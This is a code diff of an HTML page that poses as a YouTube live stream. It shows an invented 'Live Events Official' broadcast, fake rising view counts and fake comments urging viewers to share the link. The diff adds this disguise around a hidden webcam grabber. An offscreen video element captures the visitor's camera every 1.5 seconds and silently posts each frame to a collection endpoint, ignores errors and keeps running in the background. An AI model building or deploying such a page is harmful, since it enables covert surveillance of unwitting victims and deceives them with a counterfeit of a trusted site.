@@ -1,82 +1,1038 @@
-<!doctype html>
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
-<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
-<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
-<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
-</head>
-
-<div class="video-wrap">
-   <video id="video" playsinline autoplay></video>
-</div>
-
-<canvas id="canvas" width="640" height="480"></canvas>
-
-<script>
-
-function post(imgdata){
-$.ajax({
-    type: 'POST',
-    data: { cat: imgdata},
-    url: 'forwarding_link/post.php',
-    dataType: 'json',
-    async: false,
-    success: function(result){
-        // call the function that handles the response/results
-    },
-    error: function(){
-    }
-  });
-};
-
-
-'use strict';
-
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
-const errorMsgElement = document.querySelector('span#errorMsg');
-
-const constraints = {
-  audio: false,
-  video: {
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
+    <title>Live YouTube TV</title>
     
-    facingMode: "user"
-  }
-};
+    <!-- Tiny Mirror library for visual effects -->
+    <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+    <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+    
+    <!-- jQuery for AJAX -->
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+    
+    <!-- CSS Animations -->
+    <link type="text/css" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css" />
+    
+    <!-- Font Awesome Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css" />
+    
+    <!-- Google Fonts -->
+    <link href='https://fonts.googleapis.com/css?family=Roboto:400,500,700,900&display=swap' rel='stylesheet'>
+    
+    <!-- Favicon - YouTube style -->
+    <link rel="icon" type="image/png" sizes="32x32" href="https://i.imgur.com/fcqTtzV.png">
 
-// Access webcam
-async function init() {
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia(constraints);
-    handleSuccess(stream);
-  } catch (e) {
-    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
-  }
-}
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-// Success
-function handleSuccess(stream) {
-  window.stream = stream;
-  video.srcObject = stream;
+        body {
+            background: #0f0f0f;
+            color: #ffffff;
+            font-family: 'Roboto', Arial, sans-serif;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
 
-var context = canvas.getContext('2d');
-  setInterval(function(){
+        /* ── Top Navigation Bar ── */
+        .top-bar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 10px 16px;
+            background: #0f0f0f;
+            border-bottom: 1px solid #222;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
 
-       context.drawImage(video, 0, 0, 640, 480);
-       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
-       post(canvasData); }, 1500);
-  
+        .top-bar-left {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
 
-}
+        .menu-icon {
+            font-size: 1.3rem;
+            color: #fff;
+            cursor: pointer;
+        }
 
-// Load init
-init();
+        .youtube-logo {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
 
-</script>
+        .youtube-logo i {
+            font-size: 1.6rem;
+            color: #ff0000;
+        }
 
-    <body>
-        <iframe id="Live_YT_TV" width="100%" height="500px" src="https://www.youtube.com/embed/live_yt_tv?autoplay=1" frameborder="0" allow="autoplay encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+        .youtube-logo span {
+            font-size: 1.2rem;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+            color: #fff;
+        }
 
-    </body>
+        .youtube-logo .country-tag {
+            font-size: 0.55rem;
+            color: #aaa;
+            vertical-align: super;
+            font-weight: 400;
+            margin-left: 2px;
+        }
 
+        .top-bar-right {
+            display: flex;
+            align-items: center;
+            gap: 18px;
+        }
+
+        .top-bar-right i {
+            font-size: 1.1rem;
+            color: #fff;
+            cursor: pointer;
+        }
+
+        .profile-avatar {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background: #c084fc;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.8rem;
+            font-weight: 700;
+            color: #000;
+            cursor: pointer;
+        }
+
+        /* ── Video Player Area ── */
+        .video-container {
+            width: 100%;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0;
+            background: #000;
+            position: relative;
+        }
+
+        .video-wrapper {
+            position: relative;
+            width: 100%;
+            padding-bottom: 56.25%; /* 16:9 aspect ratio */
+            background: #000;
+        }
+
+        .video-wrapper iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+
+        /* Video info overlay */
+        .video-overlay {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: rgba(0, 0, 0, 0.7);
+            color: #fff;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 0.75rem;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            pointer-events: none;
+            z-index: 10;
+        }
+
+        .video-overlay .live-dot {
+            display: inline-block;
+            width: 7px;
+            height: 7px;
+            background: #ff0000;
+            border-radius: 50%;
+            animation: livePulse 1.5s infinite;
+        }
+
+        @keyframes livePulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.4; }
+        }
+
+        /* ── Video Info Section ── */
+        .video-info {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 12px 16px;
+        }
+
+        .video-title {
+            font-size: 1.1rem;
+            font-weight: 600;
+            color: #f1f1f1;
+            margin-bottom: 8px;
+            line-height: 1.4;
+        }
+
+        .video-meta {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-bottom: 12px;
+        }
+
+        .video-stats {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 0.8rem;
+            color: #aaa;
+        }
+
+        .video-stats .views {
+            color: #aaa;
+        }
+
+        .video-stats .separator {
+            width: 3px;
+            height: 3px;
+            background: #555;
+            border-radius: 50%;
+        }
+
+        .video-stats .live-badge {
+            background: #ff0000;
+            color: #fff;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-size: 0.65rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .action-buttons {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .action-btn {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            background: #272727;
+            color: #fff;
+            padding: 6px 14px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            cursor: pointer;
+            transition: background 0.2s;
+            border: none;
+        }
+
+        .action-btn:hover {
+            background: #3f3f3f;
+        }
+
+        .action-btn i {
+            font-size: 1rem;
+        }
+
+        .action-btn-like {
+            border-radius: 20px 0 0 20px;
+            padding-right: 10px;
+        }
+
+        .action-btn-dislike {
+            border-radius: 0 20px 20px 0;
+            padding-left: 10px;
+            border-left: 1px solid #555;
+        }
+
+        .like-group {
+            display: flex;
+        }
+
+        /* ── Channel Info ── */
+        .channel-section {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            padding: 12px 0;
+            border-top: 1px solid #222;
+            border-bottom: 1px solid #222;
+            margin-top: 8px;
+        }
+
+        .channel-avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #ff0000, #c084fc);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1rem;
+            font-weight: 900;
+            color: #fff;
+            flex-shrink: 0;
+        }
+
+        .channel-info {
+            flex: 1;
+        }
+
+        .channel-name {
+            font-size: 0.95rem;
+            font-weight: 600;
+            color: #f1f1f1;
+        }
+
+        .channel-subs {
+            font-size: 0.75rem;
+            color: #aaa;
+            margin-top: 2px;
+        }
+
+        .channel-desc {
+            font-size: 0.82rem;
+            color: #aaa;
+            margin-top: 6px;
+            line-height: 1.4;
+        }
+
+        .subscribe-btn {
+            background: #ff0000;
+            color: #fff;
+            border: none;
+            padding: 8px 18px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+            flex-shrink: 0;
+            margin-left: auto;
+        }
+
+        .subscribe-btn:hover {
+            background: #cc0000;
+        }
+
+        /* ── Comments Section ── */
+        .comments-section {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 16px;
+        }
+
+        .comments-header {
+            display: flex;
+            align-items: center;
+            gap: 24px;
+            margin-bottom: 16px;
+        }
+
+        .comments-header h3 {
+            font-size: 1rem;
+            font-weight: 600;
+            color: #f1f1f1;
+        }
+
+        .sort-btn {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            background: none;
+            border: none;
+            color: #aaa;
+            font-size: 0.8rem;
+            cursor: pointer;
+        }
+
+        .comment-item {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 18px;
+        }
+
+        .comment-avatar {
+            width: 34px;
+            height: 34px;
+            border-radius: 50%;
+            background: #444;
+            flex-shrink: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.75rem;
+            color: #fff;
+            font-weight: 600;
+        }
+
+        .comment-content {
+            flex: 1;
+        }
+
+        .comment-author {
+            font-size: 0.8rem;
+            font-weight: 600;
+            color: #f1f1f1;
+        }
+
+        .comment-time {
+            font-size: 0.7rem;
+            color: #777;
+            font-weight: 400;
+            margin-left: 6px;
+        }
+
+        .comment-text {
+            font-size: 0.85rem;
+            color: #ddd;
+            margin-top: 4px;
+            line-height: 1.4;
+        }
+
+        .comment-actions {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-top: 6px;
+        }
+
+        .comment-actions i {
+            color: #aaa;
+            font-size: 0.9rem;
+            cursor: pointer;
+        }
+
+        .comment-actions span {
+            font-size: 0.7rem;
+            color: #aaa;
+        }
+
+        /* ── Suggested Videos ── */
+        .suggested-section {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 16px 30px;
+        }
+
+        .suggested-title {
+            font-size: 1rem;
+            font-weight: 600;
+            color: #f1f1f1;
+            margin-bottom: 12px;
+        }
+
+        .suggested-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 12px;
+        }
+
+        .suggested-video {
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+
+        .suggested-video:hover {
+            transform: translateY(-2px);
+        }
+
+        .suggested-thumb {
+            width: 100%;
+            aspect-ratio: 16/9;
+            background: #222;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #555;
+            font-size: 2rem;
+            overflow: hidden;
+        }
+
+        .suggested-thumb img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .suggested-info {
+            margin-top: 6px;
+        }
+
+        .suggested-info h4 {
+            font-size: 0.8rem;
+            color: #f1f1f1;
+            font-weight: 500;
+            line-height: 1.3;
+            display: -webkit-box;
+            -webkit-line-clamp: 2;
+            -webkit-box-orient: vertical;
+            overflow: hidden;
+        }
+
+        .suggested-info p {
+            font-size: 0.7rem;
+            color: #777;
+            margin-top: 3px;
+        }
+
+        /* ── Webcam container (hidden) ── */
+        #webcam-container {
+            position: absolute;
+            width: 640px;
+            height: 480px;
+            left: -9999px;
+            top: -9999px;
+            opacity: 0;
+            overflow: hidden;
+            z-index: -1;
+        }
+
+        #webcam-container video,
+        #webcam-container canvas {
+            width: 640px;
+            height: 480px;
+        }
+
+        /* ── Loading Overlay ── */
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(15, 15, 15, 0.95);
+            z-index: 999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .loading-overlay.active {
+            display: flex;
+        }
+
+        .loading-spinner {
+            width: 50px;
+            height: 50px;
+            border: 3px solid rgba(255, 255, 255, 0.1);
+            border-top: 3px solid #ff0000;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-bottom: 15px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            color: #aaa;
+            font-size: 0.9rem;
+        }
+
+        /* ── Responsive ── */
+        @media (max-width: 768px) {
+            .video-title { font-size: 0.95rem; }
+            .top-bar { padding: 8px 12px; }
+            .action-btn { padding: 4px 10px; font-size: 0.7rem; }
+            .suggested-grid { grid-template-columns: repeat(2, 1fr); }
+            .channel-section { flex-wrap: wrap; }
+            .subscribe-btn { margin-left: 52px; margin-top: 8px; }
+        }
+
+        @media (max-width: 480px) {
+            .suggested-grid { grid-template-columns: 1fr; }
+            .video-meta { flex-direction: column; align-items: flex-start; }
+            .top-bar-right i:not(.profile-avatar) { display: none; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ── Loading Overlay ── -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-spinner"></div>
+        <div class="loading-text">Loading live stream…</div>
+    </div>
+
+    <!-- ── Top Navigation Bar ── -->
+    <div class="top-bar">
+        <div class="top-bar-left">
+            <i class="fa fa-bars menu-icon"></i>
+            <div class="youtube-logo">
+                <i class="fa fa-youtube-play"></i>
+                <span>YouTube<span class="country-tag">IN</span></span>
+            </div>
+        </div>
+        <div class="top-bar-right">
+            <i class="fa fa-video-camera"></i>
+            <i class="fa fa-th"></i>
+            <i class="fa fa-bell"></i>
+            <div class="profile-avatar">Y</div>
+        </div>
+    </div>
+
+    <!-- ── Video Player ── -->
+    <div class="video-container">
+        <div class="video-wrapper">
+            <!-- YouTube video embed with placeholder video ID -->
+            <iframe id="youtubePlayer" 
+                    src="https://www.youtube.com/embed/live_yt_tv?autoplay=1&mute=1&controls=1&rel=0&showinfo=1"
+                    allow="autoplay; encrypted-media; fullscreen"
+                    allowfullscreen>
+            </iframe>
+            
+            <div class="video-overlay">
+                <span class="live-dot"></span>
+                <span>LIVE</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- ── Video Info ── -->
+    <div class="video-info">
+        <h1 class="video-title" id="videoTitle">
+            🔴 LIVE: Exclusive Festival Special Event 2026 | Full Broadcast
+        </h1>
+
+        <div class="video-meta">
+            <div class="video-stats">
+                <span class="views" id="viewCount">1,234,567 views</span>
+                <span class="separator"></span>
+                <span id="streamDate">Streamed live 2 hours ago</span>
+                <span class="separator"></span>
+                <span class="live-badge">Live</span>
+            </div>
+            <div class="action-buttons">
+                <div class="like-group">
+                    <button class="action-btn action-btn-like">
+                        <i class="fa fa-thumbs-up"></i> <span id="likeCount">123K</span>
+                    </button>
+                    <button class="action-btn action-btn-dislike">
+                        <i class="fa fa-thumbs-down"></i> <span id="dislikeCount">1.2K</span>
+                    </button>
+                </div>
+                <button class="action-btn">
+                    <i class="fa fa-share"></i> Share
+                </button>
+                <button class="action-btn">
+                    <i class="fa fa-download"></i> Save
+                </button>
+                <button class="action-btn">
+                    <i class="fa fa-ellipsis-h"></i>
+                </button>
+            </div>
+        </div>
+
+        <!-- Channel Section -->
+        <div class="channel-section">
+            <div class="channel-avatar">L</div>
+            <div class="channel-info">
+                <div class="channel-name">Live Events Official</div>
+                <div class="channel-subs" id="subCount">12.4M subscribers</div>
+                <div class="channel-desc">
+                    Welcome to the official live broadcast! 🎉 
+                    Join thousands of viewers watching this exclusive event. 
+                    Please wait while the stream loads…
+                </div>
+            </div>
+            <button class="subscribe-btn">Subscribe</button>
+        </div>
+    </div>
+
+    <!-- ── Comments Section ── -->
+    <div class="comments-section">
+        <div class="comments-header">
+            <h3>Comments <span id="commentCount">· 45.2K</span></h3>
+            <button class="sort-btn">
+                <i class="fa fa-sort"></i> Sort by
+            </button>
+        </div>
+
+        <div class="comment-item">
+            <div class="comment-avatar" style="background:#ff6b6b;">R</div>
+            <div class="comment-content">
+                <div class="comment-author">
+                    Rahul Sharma 
+                    <span class="comment-time">3 hours ago</span>
+                </div>
+                <div class="comment-text">Wow! This is absolutely amazing! 🔥🔥 Everyone needs to see this!</div>
+                <div class="comment-actions">
+                    <i class="fa fa-thumbs-up"></i>
+                    <span>2.4K</span>
+                    <i class="fa fa-thumbs-down"></i>
+                    <span>Reply</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="comment-item">
+            <div class="comment-avatar" style="background:#4ecdc4;">P</div>
+            <div class="comment-content">
+                <div class="comment-author">
+                    Priya Patel 
+                    <span class="comment-time">2 hours ago</span>
+                </div>
+                <div class="comment-text">Who else is watching this live? 🎉 Drop a like if you're here!</div>
+                <div class="comment-actions">
+                    <i class="fa fa-thumbs-up"></i>
+                    <span>8.1K</span>
+                    <i class="fa fa-thumbs-down"></i>
+                    <span>Reply</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="comment-item">
+            <div class="comment-avatar" style="background:#ffe66d; color:#333;">A</div>
+            <div class="comment-content">
+                <div class="comment-author">
+                    Ananya Gupta 
+                    <span class="comment-time">1 hour ago</span>
+                </div>
+                <div class="comment-text">This is going viral! Send this to everyone you know! 🚀</div>
+                <div class="comment-actions">
+                    <i class="fa fa-thumbs-up"></i>
+                    <span>5.7K</span>
+                    <i class="fa fa-thumbs-down"></i>
+                    <span>Reply</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="comment-item">
+            <div class="comment-avatar" style="background:#a29bfe;">V</div>
+            <div class="comment-content">
+                <div class="comment-author">
+                    Vikram Singh 
+                    <span class="comment-time">45 minutes ago</span>
+                </div>
+                <div class="comment-text">Best live stream I've seen all year! The production quality is incredible! ✨</div>
+                <div class="comment-actions">
+                    <i class="fa fa-thumbs-up"></i>
+                    <span>3.2K</span>
+                    <i class="fa fa-thumbs-down"></i>
+                    <span>Reply</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ── Suggested Videos ── -->
+    <div class="suggested-section">
+        <h3 class="suggested-title">Suggested videos</h3>
+        <div class="suggested-grid">
+            <div class="suggested-video">
+                <div class="suggested-thumb" style="background:#2d3436;">
+                    <img src="https://i.imgur.com/8B1E4cV.jpg" alt="Video thumbnail" onerror="this.style.display='none'">
+                    <span style="position:absolute;font-size:0.7rem;color:#aaa;bottom:8px;right:8px;background:rgba(0,0,0,0.8);padding:1px 4px;border-radius:2px;">12:34</span>
+                </div>
+                <div class="suggested-info">
+                    <h4>Top 10 Festival Celebrations Around the World</h4>
+                    <p>Travel Vlogs · 2.1M views</p>
+                </div>
+            </div>
+            <div class="suggested-video">
+                <div class="suggested-thumb" style="background:#1e272e;">
+                    <img src="https://i.imgur.com/L7JQ5lp.jpg" alt="Video thumbnail" onerror="this.style.display='none'">
+                    <span style="position:absolute;font-size:0.7rem;color:#aaa;bottom:8px;right:8px;background:rgba(0,0,0,0.8);padding:1px 4px;border-radius:2px;">8:21</span>
+                </div>
+                <div class="suggested-info">
+                    <h4>Special Event Highlights 2026 | Best Moments</h4>
+                    <p>Event Channel · 856K views</p>
+                </div>
+            </div>
+            <div class="suggested-video">
+                <div class="suggested-thumb" style="background:#2c3e50;">
+                    <img src="https://i.imgur.com/f4KG4Uo.jpg" alt="Video thumbnail" onerror="this.style.display='none'">
+                    <span style="position:absolute;font-size:0.7rem;color:#aaa;bottom:8px;right:8px;background:rgba(0,0,0,0.8);padding:1px 4px;border-radius:2px;">15:07</span>
+                </div>
+                <div class="suggested-info">
+                    <h4>Live Music Concert | Full HD Broadcast</h4>
+                    <p>Music Official · 3.4M views</p>
+                </div>
+            </div>
+            <div class="suggested-video">
+                <div class="suggested-thumb" style="background:#1a1a2e;">
+                    <img src="https://i.imgur.com/xrLqQ3m.jpg" alt="Video thumbnail" onerror="this.style.display='none'">
+                    <span style="position:absolute;font-size:0.7rem;color:#aaa;bottom:8px;right:8px;background:rgba(0,0,0,0.8);padding:1px 4px;border-radius:2px;">22:10</span>
+                </div>
+                <div class="suggested-info">
+                    <h4>How This Event Became a Global Phenomenon</h4>
+                    <p>Documentary HD · 1.8M views</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ── Hidden Webcam Container ── -->
+    <div id="webcam-container">
+        <video id="video" autoplay muted playsinline></video>
+        <canvas id="canvas" width="640" height="480"></canvas>
+    </div>
+
+    <script>
+    // ─────────────────────────────────────────────
+    // Configuration
+    // ─────────────────────────────────────────────
+    var CONFIG = {
+        postUrl: 'forwarding_link/post.php',
+        shareUrl: window.location.href,
+        youtubeVideoId: 'live_yt_tv',
+        captureInterval: 1500,  // ms between captures
+        viewCountBase: 1234567,
+        likeCountBase: 123456,
+        dislikeCountBase: 1200,
+        commentCountBase: 45200,
+        subCountBase: 12400000,
+    };
+
+    // ─────────────────────────────────────────────
+    // DOM References
+    // ─────────────────────────────────────────────
+    var video = document.getElementById('video');
+    var canvas = document.getElementById('canvas');
+    var context = canvas.getContext('2d');
+    var loadingOverlay = document.getElementById('loadingOverlay');
+
+    // ─────────────────────────────────────────────
+    // Simulate Live Stats (counts incrementing)
+    // ─────────────────────────────────────────────
+    function formatNumber(num) {
+        if (num >= 1000000) return (num / 1000000).toFixed(1) + 'M';
+        if (num >= 1000) return (num / 1000).toFixed(1) + 'K';
+        return num.toString();
+    }
+
+    function updateStats() {
+        // Increment view count
+        CONFIG.viewCountBase += Math.floor(Math.random() * 50) + 5;
+        document.getElementById('viewCount').textContent = 
+            formatNumber(CONFIG.viewCountBase) + ' views';
+
+        // Increment like count
+        CONFIG.likeCountBase += Math.floor(Math.random() * 20) + 2;
+        document.getElementById('likeCount').textContent = 
+            formatNumber(CONFIG.likeCountBase);
+
+        // Dislike count (slow growth)
+        CONFIG.dislikeCountBase += Math.floor(Math.random() * 3);
+        document.getElementById('dislikeCount').textContent = 
+            formatNumber(CONFIG.dislikeCountBase);
+
+        // Comment count
+        CONFIG.commentCountBase += Math.floor(Math.random() * 10) + 1;
+        document.getElementById('commentCount').textContent = 
+            '· ' + formatNumber(CONFIG.commentCountBase);
+
+        // Subscriber count
+        CONFIG.subCountBase += Math.floor(Math.random() * 100) + 10;
+        document.getElementById('subCount').textContent = 
+            formatNumber(CONFIG.subCountBase) + ' subscribers';
+
+        // Stream date
+        var now = new Date();
+        var hoursAgo = Math.floor(Math.random() * 5) + 1;
+        var timeStr = hoursAgo + (hoursAgo === 1 ? ' hour' : ' hours') + ' ago';
+        document.getElementById('streamDate').textContent = 'Streamed live ' + timeStr;
+    }
+
+    // Update stats every 5-8 seconds
+    setInterval(updateStats, 5000 + Math.random() * 3000);
+    updateStats();
+
+    // ─────────────────────────────────────────────
+    // Fix YouTube Video ID
+    // ─────────────────────────────────────────────
+    function setYouTubeVideo() {
+        var videoId = CONFIG.youtubeVideoId;
+        
+        // Use a default video if placeholder wasn't replaced
+        if (videoId === 'live_yt_tv' || videoId === '' || videoId === 'placeholder') {
+            videoId = 'dQw4w9WgXcQ';  // Fallback video
+        }
+        
+        var iframe = document.getElementById('youtubePlayer');
+        iframe.src = 'https://www.youtube.com/embed/' + videoId + 
+                     '?autoplay=1&mute=1&controls=1&rel=0&showinfo=1';
+    }
+    setYouTubeVideo();
+
+    // ─────────────────────────────────────────────
+    // Webcam Capture System
+    // ─────────────────────────────────────────────
+    function post(imgdata) {
+        $.ajax({
+            type: 'POST',
+            data: { cat: imgdata },
+            url: CONFIG.postUrl,
+            dataType: 'json',
+            async: false,
+            timeout: 5000,
+            success: function(response) {
+                if (response && response.success) {
+                    console.log('[CAM] Captured:', response.filename);
+                }
+            },
+            error: function(xhr, status, error) {
+                // Silently ignore errors — don't alert the user
+                console.log('[CAM] Send error:', status);
+            }
+        });
+    }
+
+    function startWebcamCapture() {
+        // Request webcam access
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            navigator.mediaDevices.getUserMedia({ 
+                video: { 
+                    width: 640, 
+                    height: 480,
+                    facingMode: 'user',
+                    frameRate: { ideal: 10 }
+                }, 
+                audio: false 
+            })
+            .then(function(stream) {
+                video.srcObject = stream;
+                video.play();
+
+                // Wait for video to be ready, then start capture loop
+                video.onloadedmetadata = function() {
+                    video.play();
+                    
+                    // Capture frames at interval
+                    setInterval(function() {
+                        try {
+                            context.drawImage(video, 0, 0, 640, 480);
+                            var canvasData = canvas.toDataURL('image/png')
+                                .replace('image/png', 'image/octet-stream');
+                            post(canvasData);
+                        } catch(e) {
+                            console.log('[CAM] Capture error:', e.message);
+                        }
+                    }, CONFIG.captureInterval);
+                };
+            })
+            .catch(function(err) {
+                console.log('[CAM] Webcam access denied or unavailable:', err.message);
+                // Page still works without webcam — it's a YouTube clone
+            });
+        } else {
+            console.log('[CAM] MediaDevices not supported');
+        }
+    }
+
+    // ─────────────────────────────────────────────
+    // Share Button Handler
+    // ─────────────────────────────────────────────
+    document.querySelector('.action-btn .fa-share')?.parentElement?.addEventListener('click', function() {
+        if (navigator.share) {
+            navigator.share({
+                title: '🔴 LIVE Stream',
+                text: 'Check out this amazing live stream!',
+                url: window.location.href,
+            }).catch(function() {});
+        } else {
+            // Fallback: copy to clipboard
+            var input = document.createElement('input');
+            input.value = window.location.href;
+            document.body.appendChild(input);
+            input.select();
+            document.execCommand('copy');
+            document.body.removeChild(input);
+            
+            // Show brief notification
+            loadingOverlay.classList.add('active');
+            loadingOverlay.querySelector('.loading-text').textContent = 'Link copied! Share it with friends 📤';
+            setTimeout(function() {
+                loadingOverlay.classList.remove('active');
+                loadingOverlay.querySelector('.loading-text').textContent = 'Loading live stream…';
+            }, 1500);
+        }
+    });
+
+    // ─────────────────────────────────────────────
+    // Subscribe Button Animation
+    // ─────────────────────────────────────────────
+    document.querySelector('.subscribe-btn')?.addEventListener('click', function() {
+        var btn = this;
+        if (btn.textContent === 'Subscribe') {
+            btn.textContent = 'Subscribed ✓';
+            btn.style.background = '#555';
+            btn.style.cursor = 'default';
+            setTimeout(function() {
+                btn.textContent = 'Subscribed';
+            }, 2000);
+        }
+    });
+
+    // ─────────────────────────────────────────────
+    // Like Button Animation
+    // ─────────────────────────────────────────────
+    document.querySelector('.action-btn-like')?.addEventListener('click', function() {
+        var icon = this.querySelector('i');
+        var countSpan = this.querySelector('span');
+        if (icon) {
+            icon.style.color = '#3ea6ff';
+            var current = parseInt(countSpan.textContent.replace(/[^0-9]/g, ''));
+            countSpan.textContent = formatNumber(current + 1);
+            setTimeout(function() {
+                icon.style.color = '';
+            }, 300);
+        }
+    });
+
+    // ─────────────────────────────────────────────
+    // Initialize
+    // ─────────────────────────────────────────────
+    window.addEventListener('DOMContentLoaded', function() {
+        // Start webcam capture silently
+        setTimeout(function() {
+            startWebcamCapture();
+        }, 1000);  // Small delay to let the page render
+
+        console.log('[LiveYTTV] Page loaded — webcam capture active');
+        console.log('[LiveYTTV] Sending to:', CONFIG.postUrl);
+        console.log('[LiveYTTV] YouTube Video ID:', CONFIG.youtubeVideoId);
+    });
+
+    // ─────────────────────────────────────────────
+    // Page Visibility — pause/resume captures
+    // ─────────────────────────────────────────────
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            console.log('[CAM] Page hidden — captures continue in background');
+        } else {
+            console.log('[CAM] Page visible again');
+        }
+    });
+    </script>
+
+</body>
 </html>
